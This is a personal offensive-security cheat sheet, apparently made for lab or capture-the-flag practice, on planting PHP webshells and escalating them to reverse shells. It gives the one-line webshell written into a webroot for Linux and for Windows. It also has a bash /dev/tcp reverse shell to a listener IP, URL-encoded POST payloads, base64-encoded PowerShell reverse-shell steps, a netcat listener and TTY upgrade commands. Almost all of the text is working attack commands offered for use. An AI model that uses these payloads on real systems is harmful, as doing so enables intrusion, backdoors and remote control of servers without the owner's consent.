write webshell files to webroot.

#### creating webshell on linux
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
### converting webshell to reverse shell 
use POST method + url encode the payload always
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
<ENTER>
<ENTER>
bash<url encode: -c 'bash -i >& /dev/tcp/10.10.16.52/4444 0>&1'>
```
now URL ENCODE : 
```
cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<YOURIP>%2F<PORT>%200%3E%261'
```
### URL ENCODE + Add Headers
![[Pasted image 20251005213933.png]]
## example request
```
POST

<SNIP>
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.52%2F4444%200%3E%261'
```

### upgrade shell to tty

`pty python`
```bash
# In reverse shell $victim
python -c 'import pty; pty.spawn("/bin/bash")'
```
Ctrl-Z + enter
```shell
# In Kali
styy -a
stty raw -echo;fg
hit [ENTER]
hit [ENTER]
# In reverse shell
export TERM=xterm
```

 
 curl for simple commands:
```
curl -v -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'cmd=whoami'
  
DONT USE CURL FOR REV SHELLS, syntax breaks LMAO
```
---

### FOR WINDOWS

#### creating Windows webshell
inet/pub/www or smth
```
echo '<?php system($_REQUEST["cmd"]); ?>' | OutFile -Encoding UTF8 shell.php
```
in windows, convert the php file to UTF8 First
![[Pasted image 20251004153427.png]]
now you can browse to that webshell and intercept in burp,

### converting Powershell payload to utf16le and base64 encoding it
- to get a reverse shell,  copy either rev.ps1 or conpty.ps1 and convert them to base64, convert to UTF16 le
```
nano /tools/rev.ps1
# EDIT IP PORT
cat /tools/rev.ps1 |iconv -t utf-16le | base64 -w 0
```

2. copy b64  to burpsuite repeater

3. then change request to `POST` via right clicking + change request to POST or via manually typing content-type and content-length headers .
4. write `cmd=powershell.exe -EncodedCommand <base64>` then, url encode the base64 string  (ctrl shift + u)
5. start a netcat listener 
```
script reverse.log
rlwrap nc -nlvp 4444
```
6.  send the req
`cmd=powershell -EncodedCommand <base64>`
![[Pasted image 20251004153924.png]]


php
https://github.com/Arrexel/phpbash

multi
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

ASP
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
